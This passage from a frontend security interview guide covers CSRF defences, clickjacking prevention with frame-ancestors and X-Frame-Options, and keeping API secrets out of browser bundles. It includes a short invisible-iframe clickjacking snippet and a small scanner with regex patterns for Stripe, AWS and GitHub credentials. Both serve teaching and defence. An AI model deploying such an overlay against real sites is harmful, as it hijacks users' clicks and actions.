    if (!crossSite) return true;
    if (c.sameSite === 'None') return c.secure;
    if (c.sameSite === 'Lax') return topLevelNavigation && method === 'GET';
    return false;                                  // Strict
  }).map((c) => c.name);
}
const jar = [{ name: 's_strict', sameSite: 'Strict' }, { name: 's_lax', sameSite: 'Lax' }, { name: 's_none', sameSite: 'None', secure: true }];
const cases = [
  ['cross-site form POST', { crossSite: true, method: 'POST', topLevelNavigation: true }, 's_none'],
  ['cross-site <img>', { crossSite: true, method: 'GET', topLevelNavigation: false }, 's_none'],
  ['cross-site link click', { crossSite: true, method: 'GET', topLevelNavigation: true }, 's_lax,s_none'],
  ['same-site request', { crossSite: false, method: 'POST' }, 's_strict,s_lax,s_none'],
];
for (const [name, req, expected] of cases) {
  const got = cookiesSent(jar, req).join(',');
  console.log(name.padEnd(24), got.padEnd(24), got === expected ? '✅ matches Chrome' : '❌ FAIL');
}
:::

::: warning ⚠️ Common mistakes
- Thinking HttpOnly cookies prevent CSRF (they prevent reading, not sending).
- State-changing GET endpoints (`GET /delete?id=…`), exploitable even with `SameSite=Lax`.
- `SameSite=None` on session cookies without a CSRF token.
- CSRF tokens in a readable cookie only, without tying them to the session.
- Still using the deprecated `csurf` package.
:::

::: understand
- CSRF abuses automatic cookies; SameSite reduces it, tokens and origin checks close it.
:::

::: ask
- *"Does the API authenticate with cookies or with an Authorization header?"* Only cookie auth needs CSRF defences.
:::

::: important ⭐ Say this in the interview
"CSRF is when another site makes the user's browser send a request to our site and the browser attaches our cookies automatically, so HttpOnly doesn't help. My defences are SameSite cookies, CSRF tokens for state-changing requests, no side effects on GET, and Origin or Sec-Fetch-Site checks. I measured it in Chrome: a cross-site form POST and an image request carried only SameSite=None cookies, but a link click still carried Lax cookies, which is why GET must never change data. For the token I tie it to the session, for example an HMAC of the session ID sent in a header and compared in constant time, instead of the deprecated csurf package."
:::

::: links
OWASP: CSRF Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
MDN: SameSite cookies | https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value
web.dev: SameSite cookies explained | https://web.dev/articles/samesite-cookies-explained
:::

=== What is clickjacking, and how do you prevent it?
@p 2
@tags security, clickjacking, headers, iframe
@quick
- **Clickjacking (UI redressing)**: an attacker page loads **your site in an invisible iframe** and tricks the user into clicking your buttons ("Claim prize" lands on "Transfer").
- Fix on the server: **`Content-Security-Policy: frame-ancestors 'none'`** (or `'self'`/a list) and the older **`X-Frame-Options: DENY`**.
- Measured with Playwright: without headers your page **loaded inside the attacker's iframe** with the Transfer button; with `frame-ancestors 'none'` Chrome **blocked** it ("Framing … violates … frame-ancestors").
- Helmet sets `X-Frame-Options: SAMEORIGIN` by default; set `frame-ancestors` in your CSP too (Nginx/CDN works as well).
- JavaScript "frame-busting" (`if (top !== self)`) is unreliable; use headers.

::: text 🧒 In simple words
Clickjacking is like someone putting a **transparent sheet with a fake button painted on it** over your real control panel. You think you're pressing "Play game", but your finger goes straight through to "Delete account" underneath. The fix is telling the browser: **"Never put my control panel under someone else's sheet."**
:::

::: text 📖 Detailed answer
### How the attack works
`<iframe src="https://bank.example/transfer" style="opacity:0; position:absolute; z-index:2"></iframe>`  
`<button style="position:absolute; z-index:1">Click to claim your prize!</button>`
The iframe is invisible but on top; the user's click goes to the bank page, with the user's cookies.

### Headers
| Header | Values | Notes |
|---|---|---|
| `Content-Security-Policy: frame-ancestors` | `'none'`, `'self'`, `https://partner.example` | modern, flexible, overrides X-Frame-Options |
| `X-Frame-Options` | `DENY`, `SAMEORIGIN` | legacy, still widely used; no allow-list |

### Measured (Playwright + Chrome)
| Bank page | Inside the attacker's iframe |
|---|---|
| no framing headers | loaded, Transfer button present (1) |
| `frame-ancestors 'none'` + `X-Frame-Options: DENY` | blocked; console: "Framing 'http://localhost:5301/' violates the following Content Security Policy directive: frame-ancestors 'none'" |

### When you need framing
Allow only known parents: `frame-ancestors 'self' https://partner.example`, and require a user action/confirmation for sensitive operations inside frames.
:::

::: diagram Framing decision in the browser
flowchart TD
  A["attacker page embeds bank.example in an iframe"] --> H{"bank response has frame-ancestors or X-Frame-Options?"}
  H -->|"no"| L["page loads invisibly: clicks can be hijacked"]
  H -->|"frame-ancestors 'none' or DENY"| B["browser refuses to render it in the frame"]
  H -->|"'self' or allowed parent"| C{"parent allowed?"}
  C -->|"yes"| L2["loads"]
  C -->|"no"| B
:::

::: image Clickjacking and frame-ancestors (measured)
/images/security/clickjacking.svg
:::

::: text 🪜 Step by step
The measured test:
1. `bank` (`localhost:5301`) serves `/frame-open` (no headers) and `/frame-protected` (`frame-ancestors 'none'`, `X-Frame-Options: DENY`).
2. `evil` (`127.0.0.1:5302`) embeds both in iframes.
3. Playwright inspects the frames: `/frame-open` loaded and has 1 Transfer button.
4. `/frame-protected` has an empty URL and no content; the console shows the frame-ancestors violation.
5. Conclusion: one response header stops the whole attack class.
:::

::: code javascript Clickjacking protection in Express, Helmet and Nginx
const express = require('express');
const helmet = require('helmet');

const app = express();

// Option A: Helmet (also sets many other security headers)
app.use(helmet({
  frameguard: { action: 'deny' },                                   // X-Frame-Options: DENY
  contentSecurityPolicy: { directives: { defaultSrc: ["'self'"], frameAncestors: ["'none'"] } },
}));

// Option B: manual headers
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
  next();
});

app.get('/transfer', (req, res) => res.send('<button>Transfer</button>'));
app.listen(3000);

// Option C: Nginx (protects static files too)
// add_header X-Frame-Options "DENY" always;
// add_header Content-Security-Policy "frame-ancestors 'none'" always;
:::

::: code javascript Checking response headers for framing protection (runnable)
function framingPolicy(headers) {
  const h = Object.fromEntries(Object.entries(headers).map(([k, v]) => [k.toLowerCase(), String(v)]));
  const fa = /frame-ancestors\s+([^;]+)/i.exec(h['content-security-policy'] || '')?.[1]?.trim();
  if (fa) return fa === "'none'" ? 'blocked everywhere' : `allowed only for: ${fa}`;   // CSP wins over XFO
  const xfo = (h['x-frame-options'] || '').toUpperCase();
  if (xfo === 'DENY') return 'blocked everywhere';
  if (xfo === 'SAMEORIGIN') return 'allowed only for: same origin';
  return 'FRAMEABLE by any site';
}
const cases = [
  [{}, 'FRAMEABLE by any site'],
  [{ 'X-Frame-Options': 'DENY' }, 'blocked everywhere'],
  [{ 'Content-Security-Policy': "default-src 'self'; frame-ancestors 'none'" }, 'blocked everywhere'],
  [{ 'Content-Security-Policy': "frame-ancestors 'self' https://partner.example", 'X-Frame-Options': 'DENY' }, "allowed only for: 'self' https://partner.example"],
];
for (const [headers, expected] of cases) {
  const got = framingPolicy(headers);
  console.log(got.padEnd(48), got === expected ? '✅' : '❌ FAIL');
}
:::

::: warning ⚠️ Common mistakes
- Relying on JavaScript frame-busting scripts.
- Setting the header only on the HTML of some pages (set it for every HTML response).
- `X-Frame-Options: ALLOW-FROM` (not supported by modern browsers; use `frame-ancestors`).
- Forgetting that embeddable widgets need an explicit allow-list instead of `'none'`.
:::

::: understand
- Clickjacking needs your page in someone else's frame; `frame-ancestors` takes that away.
:::

::: ask
- *"Does any partner legitimately embed our pages?"* Then use an allow-list, not `'none'`.
:::

::: important ⭐ Say this in the interview
"Clickjacking is when an attacker loads our site in an invisible iframe and overlays a fake button, so the user's click actually hits our page, with their cookies. The fix is a response header: Content-Security-Policy frame-ancestors none, or self or an allow-list, plus X-Frame-Options DENY for older browsers. I tested it: without the header our page loaded inside the attacker's frame with its button, and with frame-ancestors none Chrome refused to render it. JavaScript frame-busting isn't reliable, so I set the headers in Helmet, Nginx or the CDN for every HTML response."
:::

::: links
OWASP: Clickjacking Defense Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
MDN: frame-ancestors | https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors
Helmet | https://helmetjs.github.io/
:::

=== How do you keep secrets out of frontend code and talk to APIs securely?
@p 3
@tags security, secrets, env-vars, https, api
@quick
- **Everything shipped to the browser is public**: bundles, env vars baked in at build time, source maps, network responses. Minification is not protection.
- Prefixes that **expose** variables: `VITE_*`, `NEXT_PUBLIC_*`, `REACT_APP_*`. Measured (Vite 7): `VITE_STRIPE_SECRET_KEY` **was in the bundle**; unprefixed `DATABASE_PASSWORD` was not.
- Keep secret keys on the **server** (API route, Server Action, BFF proxy); the browser only gets publishable keys.
- Secure API communication: **HTTPS** (+ HSTS), **validate responses** (schemas), handle **401/403** gracefully, backend **rate limits**, no sensitive data in URLs or logs.
- Security headers in one go: Helmet (HSTS, nosniff, referrer policy, frame options, CORP/COOP, CSP).

::: text 🧒 In simple words
Shipping a secret in frontend code is like **writing your safe's combination on the shop window and covering it with a sticker**: anyone can peel the sticker off (open DevTools). Secrets live in the back office (the server); the front window only shows what customers are allowed to see.
:::

::: text 📖 Detailed answer
### What's public in a frontend app
| Where | Visible? |
|---|---|
| JS bundles (even minified) | yes, search with DevTools or `grep` |
| `VITE_*` / `NEXT_PUBLIC_*` env vars | yes, inlined at build time |
| source maps (if deployed) | yes, the original code |
| API responses | yes, Network tab |
| `localStorage`, cookies without HttpOnly | yes |

### Measured: Vite 7 production build with this `.env`
| Variable | In `dist/` bundle? |
|---|---|
| `VITE_API_URL=https://api.example.com` | yes (fine: meant to be public) |
| `VITE_STRIPE_SECRET_KEY=sk_live_…` | **yes**: the `VITE_` prefix made it public |
| `DATABASE_PASSWORD=…` (no prefix) | no |

### Patterns
- **Backend for Frontend (BFF)**: the browser calls `/api/payments`; your server adds the secret key and calls Stripe.
- **Publishable vs secret keys**: Stripe/Maps/Firebase provide public client keys restricted by domain; secret keys stay server-side.
- **Rotate** any secret that ever reached a bundle or git history.

### Secure API communication (from your notes)
1. Always HTTPS; set HSTS.
2. Never expose secrets in frontend code.
3. Validate API responses (Zod) before using them.
4. Handle authorization errors gracefully (refresh → retry once → log out).
5. Rate-limit sensitive actions on the backend.
6. Assume the API can fail or be attacked: handle malformed responses safely.
:::

::: diagram Keeping a secret key on the server
flowchart LR
  B["browser: POST /api/checkout (no secret)"] --> S["your server or Server Action"]
  S -->|"adds STRIPE_SECRET_KEY from server env"| P["payment provider API"]
  P --> S
  S -->|"only the data the UI needs"| B
:::

::: image Secrets in frontend code (measured)
/images/security/secrets.svg
:::

::: text 🪜 Step by step
Fixing a leaked key found in a bundle:
1. Search the deployed bundle: DevTools → Sources → search `sk_live` (or `grep -r sk_live dist/`).
2. **Rotate the key now** (it's compromised; it may also be in git history).
3. Rename it without the public prefix and move the call into a server route/Server Action.
4. The browser calls `/api/checkout`; the server uses the secret key.
5. Add a CI check (secret scanning, e.g. gitleaks) so it can't happen again.
:::

::: code tsx Server-side secret use in Next.js (Server Action) vs the leaky client version
// ❌ app/checkout/LeakyButton.tsx ('use client'): the key is inlined into the browser bundle
export function LeakyButton() {
  const pay = () => fetch('https://api.payments.example/charges', {
    method: 'POST',
    headers: { Authorization: `Bearer ${process.env.NEXT_PUBLIC_PAYMENTS_SECRET_KEY}` },   // public!
  });
  return <button onClick={pay}>Pay</button>;
}

// ✅ app/checkout/actions.ts: runs only on the server; the key never leaves it
export async function createCharge(amountCents: number) {
  'use server';
  if (!Number.isInteger(amountCents) || amountCents <= 0) throw new Error('Invalid amount');
  const res = await fetch('https://api.payments.example/charges', {
    method: 'POST',
    headers: { Authorization: `Bearer ${process.env.PAYMENTS_SECRET_KEY}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ amount: amountCents, currency: 'inr' }),
  });
  if (!res.ok) throw new Error('Payment failed');
  const { id, status } = (await res.json()) as { id: string; status: string };
  return { id, status };                       // return only what the UI needs
}
:::

::: code javascript Scanning a bundle for leaked secrets (runnable)
// A tiny version of what secret scanners (gitleaks, GitHub secret scanning) do.
const bundle = `const api="https://api.example.com";const k="sk_live_51Hx9ABCDEFGHIJKLMNOP";fetch(api,{headers:{a:"AKIAIOSFODNN7EXAMPLE"}});`;
const rules = [
  ['Stripe secret key', /sk_live_[0-9a-zA-Z]{20,}/],
  ['AWS access key id', /AKIA[0-9A-Z]{16}/],
  ['GitHub token', /gh[pousr]_[A-Za-z0-9]{36,}/],
  ['Private key', /-----BEGIN (RSA |EC )?PRIVATE KEY-----/],
];
const findings = rules.filter(([, re]) => re.test(bundle)).map(([name]) => name);
console.log('findings:', findings);
console.log('the Stripe and AWS keys are detected', findings.join() === 'Stripe secret key,AWS access key id' ? '✅' : '❌ FAIL');
console.log('public URLs are not flagged', !findings.includes('api.example.com') ? '✅' : '❌ FAIL');
:::

::: warning ⚠️ Common mistakes
- Treating `VITE_`/`NEXT_PUBLIC_` variables as private because they're in `.env`.
- Deploying source maps publicly with sensitive comments or logic.
- Hiding a key with base64/obfuscation.
- Trusting API responses blindly (validate shape; handle 401/403/5xx).
- Leaving a leaked key active after removing it from the code.
:::

::: understand
- The browser is untrusted territory: no secrets there, and verify everything that comes from the network.
:::

::: ask
- *"Is this key publishable (domain-restricted) or secret?"* Only publishable keys may reach the browser.
:::

::: important ⭐ Say this in the interview
"Anything shipped to the browser is public, including env variables with VITE_ or NEXT_PUBLIC_ prefixes, which get inlined into the bundle; I verified a VITE_-prefixed 'secret' ends up in a Vite production build while an unprefixed variable doesn't. So secret keys stay on the server, in an API route, Server Action or BFF that calls the third party, and the browser only gets publishable, domain-restricted keys. For API communication I use HTTPS with HSTS, validate responses with schemas, handle 401 and 403 by refreshing or logging out, rely on backend rate limits, rotate any leaked key immediately and run secret scanning in CI."
:::

::: links
Vite: Env variables and modes | https://vite.dev/guide/env-and-mode
Next.js: Environment variables | https://nextjs.org/docs/app/guides/environment-variables
OWASP Secrets Management Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
:::
